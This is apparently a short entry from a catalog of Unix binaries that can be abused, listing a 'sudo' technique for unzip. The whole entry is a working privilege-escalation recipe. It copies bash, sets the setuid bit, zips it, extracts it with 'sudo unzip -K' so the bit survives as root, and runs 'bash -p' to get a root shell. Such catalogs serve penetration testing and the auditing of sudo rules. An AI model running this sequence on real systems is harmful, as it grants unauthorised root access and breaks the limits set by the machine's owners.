---
functions:
    sudo:
    - code: |
		cp /bin/bash .
		chmod +s ./bash
		zip bash.zip bash
		sudo unzip -K bash.zip
		./bash -p
---
